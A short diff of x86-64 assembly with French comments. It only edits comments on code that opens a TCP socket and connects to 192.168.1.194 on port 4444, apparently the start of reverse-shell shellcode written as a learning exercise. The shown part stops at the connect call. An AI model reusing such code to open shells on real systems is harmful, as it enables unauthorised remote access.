@@ -7,9 +7,9 @@ _start:
 
 ;socket parametre : inet : IPv4, sock stream = 1, 0
 mov rax, 0x29   ; syscall socket
-mov rdi, 2      ; inet en IPv4
+mov rdi, 2      ; AF_INET (IPv4)
 mov rsi, 1      ; sock stream pour tcp
-mov rdx, 0      ; protocol = 0 le noyau chosiit auto tcp
+mov rdx, 0      ; protocol = 0 (kernel choisit)
 syscall
 
 mov r12, rax    ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscall 
@@ -17,10 +17,10 @@ mov r12, rax    ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscal
 ; sockaddr_in : family(2) + port(4444) + ip + padding
 ; en little-endian 64 bits : 02 00 5c 11 c0 a8 01 c2
 xor rbx, rbx
-push rbx
+push rbx ; padding
 mov rbx, 0xc201a8c05c110002
-push rbx
-mov rsi, rsp
+push rbx ; family + port + ip
+mov rsi, rsp ; rsi pointe sur le sockaddr_in
 
 ;connect
 mov rax, 0x2a   ; syscall connect
